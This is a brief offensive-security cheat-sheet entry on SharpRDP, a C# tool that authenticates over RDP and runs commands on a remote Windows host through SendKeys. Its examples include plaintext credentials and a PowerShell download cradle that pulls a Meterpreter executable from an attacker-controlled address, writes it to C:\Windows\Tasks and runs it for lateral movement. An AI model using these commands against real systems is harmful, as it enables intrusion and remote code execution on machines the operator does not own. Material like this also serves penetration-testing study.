### SharpRDP - RDP as a Console

Although RDP is most often associated with the mstsc GUI client, it can also be used as a command-line tool.

SharpRDP is a C# application that uses the non-scriptable interfaces exposed by mstscax.dll (terminal services library), to perform authentication in the same way as mstsc.exe.

Once authentication is performed, SharpRDP allows us to execute code through SendKeys. In this manner, no GUI access is required and setting up a revers tunnel is unnecessary.

Exemple : execute notepad

```bash
C:\Tools> SharpRDP.exe computername=dev01 command=notepad username=dev1\v0lk3n password=superpassword1
```

Example : execute powershell download cradle, pulls the meterpreter executable and subsequently executes it with stacked commands

```bash
C:\Tools> SharpRDP.exe computername=dev01 command="powershell (New-Object System.Net.WebClient).DownloadFile('http://192.168.x.x/met.exe','C:\Windows\Tasks\met.exe'); C:\Windows\Tasks\met.exe" username=dev1\v0lk3n password=superpassword1
```
